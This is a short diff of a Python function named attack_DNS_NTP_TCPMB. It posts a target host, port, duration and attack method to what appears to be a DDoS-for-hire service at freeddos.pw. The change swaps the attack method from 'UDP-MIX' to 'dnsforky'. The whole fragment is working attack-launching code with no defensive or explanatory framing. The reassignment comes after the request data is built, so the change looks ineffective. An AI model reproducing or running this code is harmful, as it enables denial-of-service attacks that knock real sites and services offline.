@@ -29,7 +29,7 @@ def attack_DNS_NTP_TCPMB():
     data = f"host={ip}&port={port}&time={time}&method={method}"
     url = "https://freeddos.pw/ajax/attack"
 
-    method = 'UDP-MIX'
+    method = 'dnsforky'
 
     try:
         request = requests.post(url, headers=header, data=data).text
